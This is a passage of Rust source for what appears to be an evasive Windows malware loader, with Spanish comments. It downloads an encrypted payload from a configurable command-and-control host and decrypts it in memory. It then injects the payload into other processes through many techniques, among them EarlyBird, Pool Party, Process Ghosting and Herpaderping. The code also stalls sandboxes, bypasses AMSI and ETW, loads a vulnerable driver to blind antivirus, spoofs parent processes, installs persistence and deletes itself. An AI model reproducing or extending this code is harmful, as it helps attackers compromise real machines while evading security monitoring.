            inject_ghost_fsm(payload, ghostmask, ppid_for_ghost)
        } else {
            let dll = ctx.config.overload_target_dll.as_deref()
                .unwrap_or(r"C:\Windows\System32\version.dll");
            mega_dbg!("Inject: ruta Module Overload — dll='{}'", dll);
            #[inline(never)]
            fn inject_overload_fsm(payload: &[u8], dll: &str) -> bool {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                let m = match crate::overload::Module::new(payload.to_vec(), String::new(), dll.to_string()) {
                    Ok(m) => m,
                    Err(e) => {
                        mega_dbg!("Inject[Overload]: FALLO Module::new — {}", e);
                        return false;
                    }
                };
                let r = m.run().is_ok();
                mega_dbg!("Inject[Overload]: resultado={}", r);
                r
            }
            inject_overload_fsm(payload, dll)
        }
    } else {
        if let Some(pid) = effective_pid {
            if ctx.config.use_threadless {
                mega_dbg!("Inject: probando Threadless en PID={}", pid);
                #[inline(never)]
                fn threadless_fsm(pid: u32, sc: &[u8]) -> bool {
                    let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                    let r = unsafe { inject_threadless_remote(pid, sc) };
                    mega_dbg!("Inject[Threadless]: resultado={}", r);
                    r
                }
                if threadless_fsm(pid, payload) { return true; }
                mega_dbg!("Inject: Threadless falló, usando Pool Party como fallback");
            }
            mega_dbg!("Inject: probando Pool Party en PID={}", pid);
            #[inline(never)]
            fn pool_party_fsm(pid: u32, sc: &[u8]) -> bool {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                match crate::pool_party::pool_party_inject(pid, sc) {
                    Ok(_) => {
                        mega_dbg!("Inject[PoolParty]: resultado=true");
                        true
                    }
                    Err(e) => {
                        mega_dbg!("Inject[PoolParty]: FALLO — {}", e);
                        false
                    }
                }
            }
            if pool_party_fsm(pid, payload) { return true; }
            mega_dbg!("Inject: Pool Party falló, usando WaitingThread como fallback final");
            #[inline(never)]
            fn waiting_thread_fsm(pid: u32, sc: &[u8]) -> bool {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                match unsafe { waiting_thread_inject(pid, sc) } {
                    Ok(_) => {
                        mega_dbg!("Inject[WaitingThread]: resultado=true");
                        true
                    }
                    Err(e) => {
                        mega_dbg!("Inject[WaitingThread]: FALLO — {}", e);
                        false
                    }
                }
            }
            waiting_thread_fsm(pid, payload)
        } else {
            mega_dbg!("Inject: sin PID target — usando FuncStomp (dll='{}' export='{}')",
                ctx.config.stomp_dll, ctx.config.stomp_export);
            #[inline(never)]
            fn stomp_fsm(sc: &[u8], dll: &str, exp: &str) -> bool {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                let r = unsafe { crate::func_stomp::stomp_execute_restore(dll, exp, sc).is_ok() };
                mega_dbg!("Inject[FuncStomp]: resultado={}", r);
                r
            }
            stomp_fsm(payload, &ctx.config.stomp_dll, &ctx.config.stomp_export)
        }
    }
}

pub fn persistence_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool {
    if ctx.config.persist {
        let persist_cfg = ctx.config.persist_cfg.clone().unwrap_or_default();
        let _ = crate::persist::install_all(&persist_cfg);
        crate::persist::start_resilience_monitor(persist_cfg);
    }
    true
}

pub fn cleanup_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool {
    // Resume target thread
    if !ctx.target_info.thread_handle.is_null() {
        unsafe {
            let mut prev: u32 = 0;
            crate::recycled::nt_resume_thread(ctx.target_info.thread_handle as _, &mut prev);
        }
    }

    // Bug 8 fix: close owned handles after resume, before wipe
    unsafe {
        if !ctx.target_info.thread_handle.is_null() {
            let _ = crate::recycled::nt_close(ctx.target_info.thread_handle as _);
            ctx.target_info.thread_handle = std::ptr::null_mut();
        }
        if !ctx.target_info.process_handle.is_null() {
            let _ = crate::recycled::nt_close(ctx.target_info.process_handle as _);
            ctx.target_info.process_handle = std::ptr::null_mut();
        }
    }

    // Secure wipe context
    ctx.secure_wipe();

    if ctx.config.self_delete {
        let _ = crate::self_delete::delete_self();
    }

    // BlockHandle SDDL on target process (NtOpenProcess via RecycledGate)
    if ctx.config.block_handle && ctx.target_info.pid != 0 {
        unsafe {
            let mut hp: usize = 0;
            let mut cid = [ctx.target_info.pid as usize, 0usize];
            let mut oa: [usize; 6] = std::mem::zeroed();
            oa[0] = std::mem::size_of::<[usize; 6]>();
            let st = crate::recycled::nt_open_process(
                &mut hp, 0x7A,
                oa.as_mut_ptr() as *mut std::ffi::c_void,
                cid.as_mut_ptr() as *mut std::ffi::c_void,
            );
            if st == 0 && hp != 0 {
                let _ = crate::block_handle::block_external_handles(hp);
                crate::recycled::nt_close(hp);
            }
        }
    }

    // PE Header Stomping
    if ctx.config.stomp_own_header {
        unsafe {
            let own = get_own_image_base();
            if !own.is_null() {
                let _ = crate::stomp::stomp_mapped_region(own);
            }
        }
    }

    // Ekko Sleep Obfuscation
    if ctx.config.sleep_ms > 0 {
        crate::sleep::ekko_sleep_dynamic(ctx.config.sleep_ms);
    }
    
    if ctx.config.peb_unlink {
        let _ = crate::peb_unlink::unlink_self();
    }

    true
}

// ── Shared cleanup for Tsukuyomi early-return paths ──────────────────────

/// Runs FASE 5+6 cleanup after a Tsukuyomi technique completes.
/// Used by both `run()` and `run_with_shellcode()` early-return paths.
///
/// `injected_pid` — PID returned by the Tier A technique (the ACTUAL target).
///                   This is different from the PPID-spoofed process PID.
/// `success`      — true if injection succeeded. On failure, skip block_handle + persist.
fn goto_cleanup(
    cfg: &ChainConfig,
    payload: &mut Vec<u8>,
    injected_pid: Option<u32>,
    success: bool,
) {
    // Always zero payload memory (success or failure)
    crate::crypto::secure_zero_memory(payload);

    // Always self-delete (even on failure — the binary must disappear)
    if cfg.self_delete { let _ = crate::self_delete::delete_self(); }

    // Block external handle access on the INJECTED process (only on success)
    // NtOpenProcess via RecycledGate — no Win32 OpenProcess/CloseHandle
    if success && cfg.block_handle {
        if let Some(pid) = injected_pid {
            if pid != 0 {
                unsafe {
                    let mut hp: usize = 0;
                    let mut cid = [pid as usize, 0usize];
                    let mut oa: [usize; 6] = std::mem::zeroed();
                    oa[0] = std::mem::size_of::<[usize; 6]>();
                    let st = crate::recycled::nt_open_process(
                        &mut hp, 0x7A,
                        oa.as_mut_ptr() as *mut std::ffi::c_void,
                        cid.as_mut_ptr() as *mut std::ffi::c_void,
                    );
                    if st == 0 && hp != 0 {
                        let _ = crate::block_handle::block_external_handles(hp);
                        crate::recycled::nt_close(hp);
                    }
                }
            }
        }
    }

    // Always stomp own headers (success or failure)
    if cfg.stomp_own_header {
        unsafe {
            let own = get_own_image_base();
            if !own.is_null() { let _ = crate::stomp::stomp_mapped_region(own); }
        }
    }

    // Always sleep (covers both cases)
    if cfg.sleep_ms > 0 { crate::sleep::ekko_sleep_dynamic(cfg.sleep_ms); }
    if cfg.peb_unlink { let _ = crate::peb_unlink::unlink_self(); }

    // Install persistence only on success
    if success && cfg.persist {
        let persist_cfg = cfg.persist_cfg.clone().unwrap_or_default();
        let _ = crate::persist::install_all(&persist_cfg);
        crate::persist::start_resilience_monitor(persist_cfg);
    }
}

// ── Entry point ────────────────────────────────────────────────────────────

/// Ejecuta la cadena completa de 6 fases.
pub fn run(cfg: ChainConfig) -> Result<()> {

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 1-01: Anti-VM (multi-layer)
    // CPUID hypervisor bit + RDTSC delta + MAC prefix + cores < 4 + RAM < 4GB
    // Si detecta VM/sandbox → NtDelayExecution(24h) — NUNCA abort/exit.
    // ═══════════════════════════════════════════════════════════════════════
    if cfg.anti_vm {
        crate::anti_vm::run_anti_vm();
        // run_anti_vm() realiza sleep_indefinitely() si detecta VM — no retorna.
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 1-02: API Hammering (3M iter FPU/SIMD, configurables)
    // Outlasts sandbox window de 5 minutos.
    // ═══════════════════════════════════════════════════════════════════════
    if cfg.hammer_seed != 0 {
        crate::hammering::hammer(cfg.hammer_seed, cfg.hammer_iters, cfg.hammer_min_secs);
        // Si clock acceleration detectada → sleep 24h.
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 1-03: AMSI HBP via DR0 (zero bytes modificados)
    // Fallback: Page Guard si DR0 está ocupado.
    // PRIMERO — propietario exclusivo de DR0 + VEH antes que cualquier otro.
    // ═══════════════════════════════════════════════════════════════════════
    crate::amsi_hbp::install_amsi_hbp();

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 1-03b: AMSI Page Guard (fallback — alternative when DR0 occupied)
    // VEH-based PAGE_GUARD on AmsiScanBuffer. Independent of HBP.
    // ═══════════════════════════════════════════════════════════════════════
    if cfg.amsi_page_guard {
        let _ = crate::amsi_page_guard::install_amsi_page_guard();
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 1-04: Block-DLL-Policy en el dropper mismo
    // ProcessSignaturePolicy → EDR no puede cargar su DLL de monitoreo aquí.
    // ═══════════════════════════════════════════════════════════════════════
    if crate::payload_cfg::BLOCK_DLL {
        unsafe { let _ = crate::policy::apply_block_dll_policy(); }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 1-05: IAT Camouflage (benign import injection for ML evasion)
    // Must run early — the fake imports need to exist before any analysis.
    // ═══════════════════════════════════════════════════════════════════════
    if cfg.iat_camo_profile > 0 {
        crate::iat_camo::apply_camouflage(cfg.iat_camo_profile as usize);
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 1-05: Staged download WinHTTP (si c2_host está configurado)
    // Chunks HTTPS, SHA-256/chunk, NtAllocateVirtualMemory(MEM_LARGE_PAGES).
    // Si payload_path está configurado → se saltea el download.
    // ═══════════════════════════════════════════════════════════════════════
    let raw_payload: Vec<u8> = if !cfg.c2_host.is_empty() {
        let result = crate::winhttp_dl::download_payload(
            &cfg.c2_host,
            &cfg.c2_path,
            cfg.c2_port,
            &cfg.chunk_hashes,
        ).context("WinHTTP download failed")?;
        result.data.as_slice().to_vec()
    } else if !cfg.payload_path.is_empty() {
        std::fs::read(&cfg.payload_path)
            .with_context(|| format!("Read payload '{}' failed", cfg.payload_path))?
    } else {
        return Err(anyhow!("No payload source: set c2_host or payload_path"));
    };

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 1-06: AES-GCM decrypt in-place → zstd decompress
    // Shellcode donut queda en memoria, zero en disco.
    // ═══════════════════════════════════════════════════════════════════════
    let mut payload: Vec<u8> = {
        let encrypted = cfg.aes_key.iter().any(|&b| b != 0);
        if encrypted {
            crate::crypto::decrypt_and_decompress(&raw_payload, &cfg.aes_key, cfg.decompress_out_mb)
                .context("AES-GCM decrypt + zstd decompress failed")?
        } else {
            raw_payload
        }
    };
    // raw_payload was consumed — no need to zero it (moved)

    // ═══════════════════════════════════════════════════════════════════════
    // CASCADE RESOLVER: FreshyCalls → KnownDlls → RecycledGate → Exception
    // Inicializar syscall map ANTES de cualquier llamada NT.
    // El resolver en resolve.rs implementa el cascade automáticamente.
    // ═══════════════════════════════════════════════════════════════════════
    {
        let map = crate::syscall_map::syscall_map();
        if map.is_empty() {
            return Err(anyhow!("Cascade Resolver: all P1-P4 failed — syscall map empty"));
        }
    }

    // ── CACHE: Phantom Stubs en MEM_IMAGE ───────────────────────────────────
    // Build 7-byte stubs (mov eax,SSN; syscall; ret) en región MEM_IMAGE.
    // ETW-TI ve origen legítimo en módulo firmado.
    crate::phantom::build_phantom_stubs();

    // ═══════════════════════════════════════════════════════════════════════
    // CASCADE+: VEH Gate — alternative syscall dispatch via VEH/HW breakpoints
    // Use instead of RecycledGate when indirect syscalls are flagged by EDR.
    // ═══════════════════════════════════════════════════════════════════════
    if cfg.veh_syscalls {
        unsafe { let _ = crate::veh_gate::initialize(); }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // CASCADE+: Hells/Halos/Tartarus Gate — dynamic SSN resolution on hooked ntdll
    // Fallback resolver when standard FreshyCalls/KnownDlls/RecycledGate fail.
    // ═══════════════════════════════════════════════════════════════════════
    if cfg.hells_gate {
        unsafe { let _ = crate::hells_gate::resolve_all(); }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // PRE-FASE 3: BYOVD — load vulnerable driver to blind EDR sensors
    // Must execute BEFORE ETW muffle and process creation.
    // ═══════════════════════════════════════════════════════════════════════
    if cfg.byovd_enabled && !cfg.byovd_driver.is_empty() {
        let _ = unsafe {
            crate::byovd::run_byovd(&cfg.byovd_driver, &["MsMpEng.exe", "msmpeng.exe"])
        };
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 3-01: ETW Muffle
    // Primario: provider EnableFlags=0 (sin byte-patch)
    // Fallback: NtProtectVirtualMemory → xor eax,eax;ret
    // ═══════════════════════════════════════════════════════════════════════
    if cfg.patch_etw {
        unsafe {
            let _ = crate::etw::muffle_etw();
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 3-02 + 3-03: PPID Spoof + NtCreateUserProcess SUSPENDED
    // El proceso hijo se crea con args BENIGNOS (visibles en event log).
    // Block-DLL-Policy aplicado al hijo también.
    //
    // SKIP for Tier A techniques: they create their own processes.
    // Creating a PPID-spoofed svchost here would leak a handle and waste
    // a process that's never used by EarlyBird/Hypnosis/DirtyVanity/etc.
    // ═══════════════════════════════════════════════════════════════════════
    let tier_a_active = !matches!(cfg.injection_method,
        InjectionMethod::Auto | InjectionMethod::KiStepOver | InjectionMethod::MappingInject);

    let (mut h_target_proc, h_target_thread) = if !tier_a_active
        && cfg.target_pid.is_none()
        && cfg.ppid_parent.is_some()
    {
        let parent_pid = match cfg.ppid_parent.unwrap() {
            0 => crate::ppid::find_pid_by_name("explorer.exe").unwrap_or(0),
            p => p,
        };

        // ── NtCreateUserProcess path (NT-level, no CreateProcessW) ──────
        if cfg.nt_create_process {
            let image = r"C:\Windows\System32\svchost.exe";
            match unsafe { crate::nt_create_process::create_suspended(
                image, Some(parent_pid), crate::payload_cfg::BLOCK_DLL,
            ) } {
                Ok((hp, ht, _pid)) => (Some(hp), Some(ht)),
                Err(_) => (None, None),
            }
        } else {
            // ── Legacy ppid::spawn_with_ppid_spoof path ─────────────────
            let nethost = r"C:\Windows\System32\svchost.exe";
            match crate::ppid::spawn_with_ppid_spoof(nethost, parent_pid, true) {
                Ok((hp, ht)) => (Some(hp as usize), Some(ht as usize)),
                Err(_) => (None, None),
            }
        }
    } else {
        (None, None)
    };

    // Helper for cleanup on error (RecycledGate — no Win32 CloseHandle)
    let cleanup_handles = |hp: Option<usize>, ht: Option<usize>| {
        unsafe {
            if let Some(h) = hp { crate::recycled::nt_close(h); }
            if let Some(h) = ht { crate::recycled::nt_close(h); }
        }
    };

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 3-04: Process Argument Spoofing
    // Escribir args REALES en PEB del proceso suspendido.
    // ═══════════════════════════════════════════════════════════════════════
    if let Some(hp) = h_target_proc {
        if !cfg.real_args.is_empty() {
            if let Err(e) = crate::arg_spoof::spoof_args_in_peb(hp, &cfg.real_args) {
                cleanup_handles(h_target_proc, h_target_thread);
                return Err(e);
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 3-05: Module Overloading en target
    // Cargar xpsservices.dll en el proceso suspendido → región MEM_IMAGE.
    // Esto crea una región MEM_IMAGE backing para la ejecución del shellcode.
    // ═══════════════════════════════════════════════════════════════════════
    if let (Some(hp), Some(ref dll_path)) = (h_target_proc, &cfg.overload_target_dll) {
        // Map the backing DLL into the target process via NtMapViewOfSection
        if let Err(e) = load_dll_into_target(hp, dll_path) {
            cleanup_handles(h_target_proc, h_target_thread);
            return Err(e);
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FASE 4: INJECTION
    // ═══════════════════════════════════════════════════════════════════════

    let effective_pid = cfg.target_pid
        .or_else(|| h_target_proc.map(|hp| unsafe {
            // NtQueryInformationProcess → PID (no Win32 GetProcessId)
            #[repr(C)]
            struct PBI { _pad: [usize; 4], unique_pid: usize, _inh: usize }
            let mut pbi: PBI = std::mem::zeroed();
            let mut ret_len: u32 = 0;
            let st = crate::recycled::nt_query_information_process(
                hp, 0, &mut pbi as *mut PBI as *mut u8,
                std::mem::size_of::<PBI>() as u32, &mut ret_len,
            );
            if st == 0 { pbi.unique_pid as u32 } else { 0u32 }
        }))
        .filter(|&pid| pid != 0);

    // ── Tsukuyomi Tier A technique dispatch (run() path) ────────────────
    // Each Tier A technique creates its own process/injection target.
    // The PID returned is the ACTUAL injected process — used for cleanup.
    match cfg.injection_method {
        InjectionMethod::Auto => { /* fall through to default chain */ }

        InjectionMethod::EarlyBird => {
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::early_bird::early_bird_inject(&cfg.injection_target_exe, &payload) {
                Ok(pid) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("EarlyBird: {}", e));
                }
            }
        }

        InjectionMethod::EarlyBirdPpid => {
            let parent = match cfg.ppid_parent.unwrap_or(0) {
                0 => crate::ppid::find_pid_by_name("explorer.exe").unwrap_or(0),
                p => p,
            };
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::early_bird::early_bird_with_ppid(&cfg.injection_target_exe, &payload, parent) {
                Ok(pid) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("EarlyBird+PPID: {}", e));
                }
            }
        }

        InjectionMethod::Hypnosis => {
            let target = if cfg.injection_target_exe.is_empty() {
                r"C:\Windows\System32\notepad.exe"
            } else { &cfg.injection_target_exe };
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::hypnosis::hypnotize_and_inject(target, &payload) {
                Ok(pid) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("Hypnosis: {}", e));
                }
            }
        }

        InjectionMethod::DirtyVanity => {
            // DirtyVanity must reflect off a REAL running process (explorer.exe).
            // Never use the PPID-spoofed svchost — it's a fresh, empty process
            // with minimal loaded DLLs, unsuitable as a reflection source.
            let reflect_pid = crate::ppid::find_pid_by_name("explorer.exe").unwrap_or(0);
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::dirty_vanity::reflect_and_inject(reflect_pid, &payload) {
                Ok(pid) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("DirtyVanity: {}", e));
                }
            }
        }

        InjectionMethod::Herpaderping => {
            let is_pe_h = payload.len() > 2 && payload[0] == 0x4D && payload[1] == 0x5A;
            if !is_pe_h {
                cleanup_handles(h_target_proc, h_target_thread);
                goto_cleanup(&cfg, &mut payload, None, false);
                return Err(anyhow!("Herpaderping requires a PE payload (MZ header)"));
            }
            // Use provided decoy or load notepad.exe from disk as a realistic decoy PE.
            // An empty decoy (0 bytes on disk) is worse OPSEC than a real benign PE.
            let decoy_owned: Vec<u8>;
            let decoy = if let Some(ref d) = cfg.herpaderp_decoy {
                d.as_slice()
            } else {
                decoy_owned = std::fs::read(r"C:\Windows\System32\notepad.exe").unwrap_or_default();
                &decoy_owned
            };
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::herpaderping::herpaderp(&payload, decoy, None) {
                Ok(pid) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("Herpaderping: {}", e));
                }
            }
        }

        InjectionMethod::ModuleStomp => {
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::module_stomp::stomp_and_execute(&payload, None) {
                Ok(()) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    // ModuleStomp runs in-process — no separate PID to protect
                    goto_cleanup(&cfg, &mut payload, None, true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("ModuleStomp: {}", e));
                }
            }
        }

        InjectionMethod::ProxyDll => {
            if cfg.injection_target_exe.is_empty() {
                cleanup_handles(h_target_proc, h_target_thread);
                goto_cleanup(&cfg, &mut payload, None, false);
                return Err(anyhow!("ProxyDll requires --inject-target-exe <dll_path>"));
            }
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::proxy_dll::proxy_load_chained(&cfg.injection_target_exe) {
                Ok(_h) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    // ProxyDll loads in-process — no separate PID
                    goto_cleanup(&cfg, &mut payload, None, true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("ProxyDll: {}", e));
                }
            }
        }

        InjectionMethod::PoolParty => {
            let pid = effective_pid.unwrap_or(0);
            if pid == 0 {
                cleanup_handles(h_target_proc, h_target_thread);
                goto_cleanup(&cfg, &mut payload, None, false);
                return Err(anyhow!("PoolParty: no target PID"));
            }
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::pool_party::pool_party_inject(pid, &payload) {
                Ok(_) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("PoolParty: {}", e));
                }
            }
        }

        InjectionMethod::Overload => {
            let dll = cfg.overload_target_dll.as_deref()
                .unwrap_or(r"C:\Windows\System32\version.dll");
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::overload::Module::new(payload.to_vec(), String::new(), dll.to_string()) {
                Ok(m) => match m.run() {
                    Ok(_) => {
                        cleanup_handles(h_target_proc, h_target_thread);
                        goto_cleanup(&cfg, &mut payload, None, true);
                        return Ok(());
                    }
                    Err(e) => {
                        cleanup_handles(h_target_proc, h_target_thread);
                        goto_cleanup(&cfg, &mut payload, None, false);
                        return Err(anyhow!("Overload run: {}", e));
                    }
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("Overload init: {}", e));
                }
            }
        }

        InjectionMethod::Phantom => {
            let ghostmask = crate::payload_cfg::GHOST_MASQUERADE;
            let ppid = cfg.ppid_parent.unwrap_or(0);
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match crate::ghost::spawn_ghosted(&payload, ghostmask, ppid) {
                Ok(()) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("Phantom/Ghost: {}", e));
                }
            }
        }

        InjectionMethod::KiStepOver => {
            // KiStepOver is a pre-treatment: install HW breakpoints on EDR-hooked
            // syscalls, then fall through to the default injection chain.
            // The breakpoints make subsequent NtAllocateVirtualMemory/NtWriteVirtualMemory/etc.
            // invisible to EDR hooks.
            let _ = crate::ki_step_over::install_step_over(&[
                "NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtProtectVirtualMemory",
                "NtCreateThreadEx", "NtMapViewOfSection", "NtCreateSection",
            ]);
        }

        InjectionMethod::EarlyCascade => {
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            let parent = cfg.ppid_parent.map(|p| if p == 0 {
                crate::ppid::find_pid_by_name("explorer.exe").unwrap_or(0)
            } else { p }).unwrap_or(0);
            let result = if parent > 0 {
                unsafe { crate::early_cascade::cascade_inject_ppid(
                    &cfg.injection_target_exe, &payload, parent) }
            } else {
                unsafe { crate::early_cascade::cascade_inject(
                    &cfg.injection_target_exe, &payload) }
            };
            match result {
                Ok(pid) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("EarlyCascade: {}", e));
                }
            }
        }

        InjectionMethod::MappingInject => {
            // Standalone Mapping Injection — use the dedicated module
            if let Some(pid) = effective_pid {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                match unsafe { crate::mapping_inject::mapping_inject(pid, &payload) } {
                    Ok(_base) => {
                        cleanup_handles(h_target_proc, h_target_thread);
                        goto_cleanup(&cfg, &mut payload, effective_pid, true);
                        return Ok(());
                    }
                    Err(e) => {
                        cleanup_handles(h_target_proc, h_target_thread);
                        goto_cleanup(&cfg, &mut payload, None, false);
                        return Err(anyhow!("MappingInject: {}", e));
                    }
                }
            } else {
                cleanup_handles(h_target_proc, h_target_thread);
                goto_cleanup(&cfg, &mut payload, None, false);
                return Err(anyhow!("MappingInject: no target PID available"));
            }
        }

        InjectionMethod::WaitingThreadHijack => {
            // Enhanced WAIT-state-aware thread hijacking
            if let Some(pid) = effective_pid {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                match unsafe { crate::waiting_thread::inject(pid, &payload) } {
                    Ok(()) => {
                        cleanup_handles(h_target_proc, h_target_thread);
                        goto_cleanup(&cfg, &mut payload, effective_pid, true);
                        return Ok(());
                    }
                    Err(e) => {
                        cleanup_handles(h_target_proc, h_target_thread);
                        goto_cleanup(&cfg, &mut payload, None, false);
                        return Err(anyhow!("WaitingThreadHijack: {}", e));
                    }
                }
            } else {
                cleanup_handles(h_target_proc, h_target_thread);
                goto_cleanup(&cfg, &mut payload, None, false);
                return Err(anyhow!("WaitingThreadHijack: no target PID available"));
            }
        }

        InjectionMethod::NtCreateProcess => {
            // NtCreateUserProcess + Early Bird APC injection
            let parent = cfg.ppid_parent.map(|p| if p == 0 {
                crate::ppid::find_pid_by_name("explorer.exe").unwrap_or(0)
            } else { p }).unwrap_or(0);
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match unsafe { crate::nt_create_process::create_and_inject(
                &cfg.injection_target_exe, &payload, Some(parent),
            ) } {
                Ok(pid) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, Some(pid), true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("NtCreateProcess: {}", e));
                }
            }
        }

        InjectionMethod::ReflectivePe => {
            // Reflective PE Loader — manual PE mapping in-process
            if payload.len() < 2 || payload[0] != 0x4D || payload[1] != 0x5A {
                cleanup_handles(h_target_proc, h_target_thread);
                goto_cleanup(&cfg, &mut payload, None, false);
                return Err(anyhow!("ReflectivePe requires PE payload (MZ header)"));
            }
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            match unsafe { crate::pe_loader::PE::run(payload.clone()) } {
                Ok(()) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, true);
                    return Ok(());
                }
                Err(e) => {
                    cleanup_handles(h_target_proc, h_target_thread);
                    goto_cleanup(&cfg, &mut payload, None, false);
                    return Err(anyhow!("ReflectivePe: {}", e));
                }
            }
        }
    }

    let is_pe = payload.len() > 2 && payload[0] == 0x4D && payload[1] == 0x5A;

    if is_pe {
        // ── PE payload: Reflective PE → Process Ghosting (>=35MB) → Module Overloading ──
        if cfg.reflective_pe {
            let _sp = unsafe { crate::stack_spoof::spoof_caller() };
            if let Err(e) = unsafe { crate::pe_loader::PE::run(payload.clone()) } {
                cleanup_handles(h_target_proc, h_target_thread);
                return Err(anyhow!("Reflective PE: {}", e));
            }
        } else {
        let size_mb = payload.len() / (1024 * 1024);
        let ghostmask = crate::payload_cfg::GHOST_MASQUERADE;
        let ppid_for_ghost = cfg.ppid_parent.unwrap_or(0);

        let result = if size_mb >= 35 {
            // Process Ghosting — SEC_IMAGE con delete-pending
            #[inline(never)]
            fn inject_ghost(payload: &[u8], mask: &str, ppid: u32) -> Result<()> {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                crate::ghost::spawn_ghosted(payload, mask, ppid)
            }
            inject_ghost(&payload, ghostmask, ppid_for_ghost)
        } else {
            // Module Overloading — SEC_IMAGE backed
            let dll = cfg.overload_target_dll.as_deref()
                .unwrap_or(r"C:\Windows\System32\version.dll");
            #[inline(never)]
            fn inject_overload(payload: &[u8], dll: &str) -> Result<()> {
                let _sp = unsafe { crate::stack_spoof::spoof_caller() };
                let m = crate::overload::Module::new(payload.to_vec(), String::new(), dll.to_string())
                    .map_err(|e| anyhow!("Module::new: {:?}", e))?;
                m.run().map_err(|e| anyhow!("Module::run: {:?}", e))?;
                Ok(())
            }
            inject_overload(&payload, dll)
        };

        if let Err(e) = result {
            cleanup_handles(h_target_proc, h_target_thread);
            return Err(e);
        }
        } // end else (non-reflective PE)
    } else {
        // ── Shellcode payload ──────────────────────────────────────────────────
        // Cadena: Threadless → Pool Party → WaitingThread

        let mut injected = false;

